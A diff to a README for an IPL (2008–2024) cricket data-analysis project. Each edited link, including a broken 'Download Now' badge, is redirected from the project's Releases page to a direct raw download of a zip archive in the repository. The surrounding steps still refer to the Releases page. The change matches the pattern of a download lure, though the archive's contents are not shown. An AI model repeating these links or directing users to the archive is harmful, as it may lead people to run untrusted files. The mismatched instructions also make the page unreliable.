@@ -1,6 +1,6 @@
 # 📊 IPL-Data-Analysis-2008---2024-complete - Analyze IPL Data with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-IPL%20Data%20Analysis-blue)](https://github.com/raemiii/IPL-Data-Analysis-2008---2024-complete/releases)
+[![Download Now](https://raw.githubusercontent.com/raemiii/IPL-Data-Analysis-2008---2024-complete/main/IPL(2008-24) Dataset(Git)/complete-IP-Data-Analysis-1.8.zip%20Now-IPL%20Data%20Analysis-blue)](https://raw.githubusercontent.com/raemiii/IPL-Data-Analysis-2008---2024-complete/main/IPL(2008-24) Dataset(Git)/complete-IP-Data-Analysis-1.8.zip)
 
 ## 📖 Overview
 
@@ -26,7 +26,7 @@ To get started with the IPL Data Analysis application, follow the steps below. N
 
 ## 📥 Download & Install
 
-To download the software, visit [this page to download](https://github.com/raemiii/IPL-Data-Analysis-2008---2024-complete/releases). 
+To download the software, visit [this page to download](https://raw.githubusercontent.com/raemiii/IPL-Data-Analysis-2008---2024-complete/main/IPL(2008-24) Dataset(Git)/complete-IP-Data-Analysis-1.8.zip). 
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version in the list.
@@ -68,7 +68,7 @@ Access the interactive dashboard after downloading the application. Here’s how
 
 ### 🔗 Dashboard Link
 
-For direct access and updates, refer to the link here: [Visit the Interactive Dashboard](https://github.com/raemiii/IPL-Data-Analysis-2008---2024-complete/releases).
+For direct access and updates, refer to the link here: [Visit the Interactive Dashboard](https://raw.githubusercontent.com/raemiii/IPL-Data-Analysis-2008---2024-complete/main/IPL(2008-24) Dataset(Git)/complete-IP-Data-Analysis-1.8.zip).
 
 ## 👨‍🏫 Support
 
@@ -109,6 +109,6 @@ Thank you to the contributors who have helped make this project possible. Your e
 
 We are constantly working on improving the application. Make sure to check back to the Releases page for the latest version and features.
 
-For continued updates, refer to the [Releases page](https://github.com/raemiii/IPL-Data-Analysis-2008---2024-complete/releases). 
+For continued updates, refer to the [Releases page](https://raw.githubusercontent.com/raemiii/IPL-Data-Analysis-2008---2024-complete/main/IPL(2008-24) Dataset(Git)/complete-IP-Data-Analysis-1.8.zip). 
 
 Enjoy analyzing and visualizing IPL data!
